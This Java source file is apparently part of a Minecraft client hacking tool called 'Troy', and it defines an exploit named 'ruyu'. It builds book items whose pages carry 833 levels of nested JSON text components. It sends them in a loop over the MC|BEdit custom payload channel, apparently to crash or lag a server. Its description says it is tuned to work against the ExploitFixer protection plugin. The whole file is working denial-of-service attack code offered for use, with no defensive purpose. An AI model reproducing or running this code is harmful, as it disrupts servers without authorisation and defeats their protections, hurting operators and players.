package it.md_4.troy.exploit.impl.nbt;

import it.md_4.troy.exception.ExploitException;
import it.md_4.troy.exploit.argument.Argument;
import it.md_4.troy.helper.ChatHelper;
import io.netty.buffer.Unpooled;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;
import it.md_4.troy.exploit.Exploit;
import it.md_4.troy.exploit.ExploitInfo;
import it.md_4.troy.exploit.ExploitType;
import it.md_4.troy.holder.ExploitHolder;

@ExploitInfo(
        name = "ruyu",
        type = ExploitType.NBT,
        description = "Similar to goro but even more efficient with ExploitFixer"
)
public class Ruyu1 extends Exploit<PacketBuffer> {

    public Ruyu1() {
        super(() -> {
                    ItemStack itemStack = new ItemStack(Items.written_book);
                    NBTTagCompound compound = new NBTTagCompound();

                    NBTTagList pages = new NBTTagList();
                    pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

                    compound.setString("author", RandomStringUtils.randomAlphabetic(10));
                    compound.setString("title", RandomStringUtils.randomAlphabetic(10));
                    compound.setByte("resolved", (byte) 1);
                    compound.setTag("pages", pages);

                    itemStack.setTagCompound(compound);

                    PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(itemStack);

                    return packetBuffer;
                },
                new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        int packets = (Integer) args[0];

        //NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&3Troy"), "Ruyu method started! " + getName() + args[0], 4));

        ChatHelper.printMessage(
                String.format("&b â€¢ &bSending &8[&7Method: &3%s&7, Packets: &3%s&8]", getName(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {

                    NBTTagCompound tag = new NBTTagCompound();
                    NBTTagList list = new NBTTagList();
                    StringBuilder value = new StringBuilder();
                    value.append("{");
                    int bvalue = 833;

                    int i2;
                    for (i2 = 0; i2 < bvalue; ++i2) {
                        value.append("extra:[{");
                    }

                    for (i2 = 0; i2 < bvalue; ++i2) {
                        value.append("text:\u017F}],");
                    }
                    value.append("text:\u017F}");
                    list.appendTag(new NBTTagString(value.toString()));
                    tag.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                    tag.setString("title", "Troy");
                    tag.setByte("resolved", (byte) 1);
                    tag.setTag("pages", list);
                    ItemStack book = new ItemStack(Items.writable_book);
                    book.setTagCompound(tag);
                    PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                    pb.writeItemStackToBuffer(book);
                    Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BEdit", pb));
                    Thread.sleep(1500L);
                }
            } catch (InterruptedException ignored) {
            }
        })).start();
    }
}
